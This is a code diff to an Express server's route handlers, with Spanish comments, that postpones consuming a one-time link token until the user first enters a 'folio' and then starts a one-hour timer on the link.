@@ -230,10 +230,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Actualizar el token con el sessionId creado
         await linkTokenService.updateTokenSession(token, sessionId);
         
-        // AHORA sí consumir el token - solo cuando se crea la sesión real
-        await linkTokenService.consumeToken(token);
+        // NO consumir el token aún - se consumirá cuando el usuario ingrese el folio
 
-        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, token consumido`);
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
       } else {
         console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
       }
@@ -309,10 +308,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Actualizar el token con el sessionId creado
         await linkTokenService.updateTokenSession(token, sessionId);
         
-        // AHORA sí consumir el token - solo cuando se crea la sesión real
-        await linkTokenService.consumeToken(token);
+        // NO consumir el token aún - se consumirá cuando el usuario ingrese el folio
 
-        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, token consumido`);
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
       } else {
         console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
       }
@@ -1132,13 +1130,22 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       // Actualizar sesión
       const session = await storage.updateSession(id, req.body);
 
-      // Si el usuario ingresó el folio por primera vez, activar timer del link (1 hora)
+      // Si el usuario ingresó el folio por primera vez: consumir token y activar timer de 1 hora
       if (currentSession && !currentSession.hasUserData && session.hasUserData) {
         try {
+          // Obtener el link asociado a esta sesión para consumir su token
+          const link = await linkTokenService.getLinkBySession(id);
+          if (link && link.token) {
+            // Consumir el token - ahora el link NO se puede volver a usar
+            await linkTokenService.consumeToken(link.token);
+            console.log(`[Links] Token ${link.token} consumido (usuario ingresó el folio)`);
+          }
+          
+          // Activar timer de 1 hora
           await linkTokenService.startLinkTimer(id);
-          console.log(`[Links] Timer de 1 hora activado para sesión ${id} (usuario ingresó el folio)`);
+          console.log(`[Links] Timer de 1 hora activado para sesión ${id}`);
         } catch (error) {
-          console.error(`[Links] Error al activar timer para sesión ${id}:`, error);
+          console.error(`[Links] Error al consumir token/activar timer para sesión ${id}:`, error);
         }
       }
 
